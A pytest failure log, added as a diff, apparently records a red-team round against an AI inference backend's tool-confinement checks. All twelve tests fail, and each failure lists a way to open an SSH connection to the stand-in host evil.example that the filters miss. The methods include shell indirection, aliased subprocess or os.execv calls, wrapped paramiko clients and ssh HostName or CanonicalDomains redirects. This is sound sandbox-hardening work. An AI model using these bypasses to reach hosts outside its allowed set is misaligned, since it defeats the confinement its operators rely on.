@@ -1,0 +1,82 @@
+FFFFFFFFFFFF                                                             [100%]
+=================================== FAILURES ===================================
+_________ test_indirect_commands[cmd=ssh; "$cmd" -F none evil.example] _________
+/evidence/round4_regressions.py:8: in test_indirect_commands
+    assert _find_blocked_commands(command)
+E   assert set()
+E    +  where set() = _find_blocked_commands('cmd=ssh; "$cmd" -F none evil.example')
+__ test_indirect_commands[cmd=/usr/bin/ssh; env "$cmd" -F none evil.example] ___
+/evidence/round4_regressions.py:8: in test_indirect_commands
+    assert _find_blocked_commands(command)
+E   assert set()
+E    +  where set() = _find_blocked_commands('cmd=/usr/bin/ssh; env "$cmd" -F none evil.example')
+__________ test_indirect_commands[$(printf ssh) -F none evil.example] __________
+/evidence/round4_regressions.py:8: in test_indirect_commands
+    assert _find_blocked_commands(command)
+E   AssertionError: assert set()
+E    +  where set() = _find_blocked_commands('$(printf ssh) -F none evil.example')
+_ test_python_indirection[import subprocess; launch=subprocess.run; launch(['ssh','-F','none','evil.example'])] _
+/evidence/round4_regressions.py:20: in test_python_indirection
+    assert _check_code_safety(code,session_id='round4') is not None
+E   assert None is not None
+E    +  where None = _check_code_safety("import subprocess; launch=subprocess.run; launch(['ssh','-F','none','evil.example'])", session_id='round4')
+_ test_python_indirection[import os; launch=os.execv; launch('/usr/bin/ssh',['ssh','-F','none','evil.example'])] _
+/evidence/round4_regressions.py:20: in test_python_indirection
+    assert _check_code_safety(code,session_id='round4') is not None
+E   assert None is not None
+E    +  where None = _check_code_safety("import os; launch=os.execv; launch('/usr/bin/ssh',['ssh','-F','none','evil.example'])", session_id='round4')
+_ test_python_indirection[import paramiko\ndef make():\n return paramiko.SSHClient()\nmake().connect(hostname='evil.example')] _
+/evidence/round4_regressions.py:20: in test_python_indirection
+    assert _check_code_safety(code,session_id='round4') is not None
+E   assert None is not None
+E    +  where None = _check_code_safety("import paramiko\ndef make():\n return paramiko.SSHClient()\nmake().connect(hostname='evil.example')", session_id='round4')
+_ test_python_indirection[import paramiko\ndef make():\n return paramiko.SSHClient()\nc=make(); c.connect(hostname='evil.example')] _
+/evidence/round4_regressions.py:20: in test_python_indirection
+    assert _check_code_safety(code,session_id='round4') is not None
+E   assert None is not None
+E    +  where None = _check_code_safety("import paramiko\ndef make():\n return paramiko.SSHClient()\nc=make(); c.connect(hostname='evil.example')", session_id='round4')
+_ test_python_indirection[import paramiko\ndef make():\n c=paramiko.SSHClient()\n return c\nmake().connect(hostname='evil.example')] _
+/evidence/round4_regressions.py:20: in test_python_indirection
+    assert _check_code_safety(code,session_id='round4') is not None
+E   assert None is not None
+E    +  where None = _check_code_safety("import paramiko\ndef make():\n c=paramiko.SSHClient()\n return c\nmake().connect(hostname='evil.example')", session_id='round4')
+_ test_python_indirection[from paramiko.transport import Transport; Transport(('evil.example',22))] _
+/evidence/round4_regressions.py:20: in test_python_indirection
+    assert _check_code_safety(code,session_id='round4') is not None
+E   assert None is not None
+E    +  where None = _check_code_safety("from paramiko.transport import Transport; Transport(('evil.example',22))", session_id='round4')
+_ test_python_indirection[import paramiko; paramiko.transport.Transport(('evil.example',22))] _
+/evidence/round4_regressions.py:20: in test_python_indirection
+    assert _check_code_safety(code,session_id='round4') is not None
+E   assert None is not None
+E    +  where None = _check_code_safety("import paramiko; paramiko.transport.Transport(('evil.example',22))", session_id='round4')
+__ test_cli_redirects[ssh -F none approved.example -o HostName=evil.example] ___
+/evidence/round4_regressions.py:25: in test_cli_redirects
+    assert check_ssh_command_access(command,'round4') is not None
+E   AssertionError: assert None is not None
+E    +  where None = check_ssh_command_access('ssh -F none approved.example -o HostName=evil.example', 'round4')
+_ test_cli_redirects[ssh -F none -o CanonicalizeHostname=always -o CanonicalDomains=evil.example approved.example] _
+/evidence/round4_regressions.py:25: in test_cli_redirects
+    assert check_ssh_command_access(command,'round4') is not None
+E   AssertionError: assert None is not None
+E    +  where None = check_ssh_command_access('ssh -F none -o CanonicalizeHostname=always -o CanonicalDomains=evil.example approved.example', 'round4')
+=============================== warnings summary ===============================
+studio/backend/core/inference/tool_confinement.py:262
+  /work/studio/backend/core/inference/tool_confinement.py:262: DeprecationWarning: Due to '_pack_', the '_PathBeneathAttr' Structure will use memory layout compatible with MSVC (Windows). If this is intended, set _layout_ to 'ms'. The implicit default is deprecated and slated to become an error in Python 3.19.
+    class _PathBeneathAttr(ctypes.Structure):
+
+-- Docs: https://docs.pytest.org/en/stable/how-to/capture-warnings.html
+=========================== short test summary info ============================
+FAILED ../evidence/round4_regressions.py::test_indirect_commands[cmd=ssh; "$cmd" -F none evil.example]
+FAILED ../evidence/round4_regressions.py::test_indirect_commands[cmd=/usr/bin/ssh; env "$cmd" -F none evil.example]
+FAILED ../evidence/round4_regressions.py::test_indirect_commands[$(printf ssh) -F none evil.example]
+FAILED ../evidence/round4_regressions.py::test_python_indirection[import subprocess; launch=subprocess.run; launch(['ssh','-F','none','evil.example'])]
+FAILED ../evidence/round4_regressions.py::test_python_indirection[import os; launch=os.execv; launch('/usr/bin/ssh',['ssh','-F','none','evil.example'])]
+FAILED ../evidence/round4_regressions.py::test_python_indirection[import paramiko\ndef make():\n return paramiko.SSHClient()\nmake().connect(hostname='evil.example')]
+FAILED ../evidence/round4_regressions.py::test_python_indirection[import paramiko\ndef make():\n return paramiko.SSHClient()\nc=make(); c.connect(hostname='evil.example')]
+FAILED ../evidence/round4_regressions.py::test_python_indirection[import paramiko\ndef make():\n c=paramiko.SSHClient()\n return c\nmake().connect(hostname='evil.example')]
+FAILED ../evidence/round4_regressions.py::test_python_indirection[from paramiko.transport import Transport; Transport(('evil.example',22))]
+FAILED ../evidence/round4_regressions.py::test_python_indirection[import paramiko; paramiko.transport.Transport(('evil.example',22))]
+FAILED ../evidence/round4_regressions.py::test_cli_redirects[ssh -F none approved.example -o HostName=evil.example]
+FAILED ../evidence/round4_regressions.py::test_cli_redirects[ssh -F none -o CanonicalizeHostname=always -o CanonicalDomains=evil.example approved.example]
+12 failed, 1 warning in 0.12s
